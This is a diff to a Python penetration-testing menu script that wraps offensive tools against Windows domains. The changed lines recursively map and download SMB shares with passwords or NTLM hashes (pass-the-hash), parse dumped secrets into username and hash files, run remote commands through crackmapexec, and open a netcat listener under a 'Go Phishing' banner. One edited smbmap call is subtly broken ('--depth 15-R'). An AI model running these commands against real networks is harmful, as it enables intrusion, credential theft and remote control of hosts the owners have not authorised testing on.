@@ -1738,10 +1738,10 @@ while True:
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
             print("[*] Mapping Shares...")
-            command("smbmap -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -r")      
+            command("smbmap -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " --depth 15-R")      
          else:
             print("[*] Mapping Shares...")
-            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -r")
+            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " --depth 15 -R")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -1757,20 +1757,16 @@ while True:
       
       if IP46 == "-6":
          print(colored("[!] WARNING!!! - Not compatable with IP 6...", colour4)) 
-         
-      if TSH[:5] == "EMPTY":
-         print("[-] SHARE NAME has not been specified...")
-         checkParams = 1
       
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
             print("[+] Downloading any found files...")
-            command("smbmap -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + fileExt + " -s " + TSH.rstrip(" ") + " -R")
+            command("smbmap -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + fileExt + " -s " + TSH.rstrip(" ") + " --depth 15 -R")
 
          else:
             print("[+] Downloading any found files...")
-            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + fileExt + " -s " + TSH.rstrip(" ") + " -R") 
+            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + fileExt + " -s " + TSH.rstrip(" ") + " --depth 15 -R") 
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2315,25 +2311,21 @@ while True:
             command("touch tokens.txt")
              
             for x in range(0, count):
-               data = linecache.getline("ssecrets.tmp", x + 1)
+               data = linecache.getline("ssecrets.tmp", x + 1)               
+               data = data.replace(":::","")				# REMOVE AS IT MESSES WITH THE SPLIT COMMAND 
                
-               data = data.replace(":::","")				# TIDY UP THE DATA
-               temp = DOM.rstrip(" ") + "\\"
-               data = data.replace(temp,"")
-               temp = DOM.rstrip(" ") + ".LOCAL\\"
-               data = data.replace(temp,"")
-
                try:
                   get1,get2,get3,get4 = data.split(":") 
                except ValueError:
-                  if get1 == "":
-                     get1 == "Error..."
-                  if get2 == "":
-                     get2 == "Error..."
-                  if get3 == "":
-                     get3 == "Error..."
-                  if get4 == "":
-                     get4 == "Error..."
+                  try:
+                     print(colored("[!] WARNING!!! - Huston, we encountered a problem while unpacking a hash value, but fixed it in situ... just letting you know!!...", colour4))
+                     get1, get2, get3 = data.split(":")
+                     get4 = get3
+                  except:
+                     get1 = "Major Error..."
+                     get2 = "Major Error..."
+                     get3 = "Major Error..."
+                     get4 = "Major Error..."
 
                get1 = get1.rstrip("\n")
                get2 = get1.rstrip("\n")
@@ -2343,14 +2335,15 @@ while True:
                print(colored("[+] Found User " + get1,colour2))
             
                USER[x] = get1[:COL3]
-               USER[x] = USER[x].lower().replace(DOM.lower().rstrip(" ") + "\\","")	# STRIP ANY REMAINING DOMAIN NAME
+#               USER[x] = USER[x].lower().replace(DOM.lower().rstrip(" ") + "\\","")	# STRIP ANY REMAINING DOMAIN NAME
                HASH[x] = get4[:COL4]
-               
                USER[x] = spacePadding(USER[x], COL3) 					# TIDY UP DATA
                HASH[x] = spacePadding(HASH[x], COL4)
-            
+                           
                command("echo " + USER[x].rstrip(" ") + " >> usernames.txt")		# SAVE DATA	
                command("echo " + HASH[x].rstrip(" ") + " >> hashes.txt")           
+         else:      
+            print("[-] No users were found. check the domain name is correct...")               
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2379,7 +2372,7 @@ while True:
          
             print("\n[+] Trying a few other command while I am here...\n")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'net user Administrator /domain'")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -X '$PSVersionTable'")         
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -X '\$PSVersionTable'")         
          else:
             print("[i] Using HASH value as password credential")
             print("[*] Enumerating, please wait...")          
@@ -2395,7 +2388,8 @@ while True:
          
             print("\n[+] Trying a few other command while I am here...\n")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' -x 'net user Administrator /domain'")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' -X '$PSVersionTable'")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' -X '\$PSVersionTable'")
+            
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2654,6 +2648,15 @@ while True:
       if checkParams != 1:
          command("xdotool key Ctrl+Shift+T")
          command("xdotool key Alt+Shift+S; xdotool type 'Go Phishing'; xdotool key Return; sleep 2")
+         
+         print("  ____  ___    ____  _   _ ___ ____  _   _ ___ _   _  ____ ")
+         print(" / ___|/ _ \  |  _ \| | | |_ _/ ___|| | | |_ _| \ | |/ ___|")
+         print("| |  _| | | | | |_) | |_| || |\___ \| |_| || ||  \| | |  _ ")
+         print("| |_| | |_| | |  __/|  _  || | ___) |  _  || || |\  | |_| |")
+         print(" \____|\___/  |_|   |_| |_|___|____/|_| |_|___|_| \_|\____|")
+         print("                                                           ")
+         print("   BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)  \n")
+         
          command("xdotool type 'nc -nvlp 80'; xdotool key Return")
          command("xdotool key Ctrl+Shift+Tab")
                  
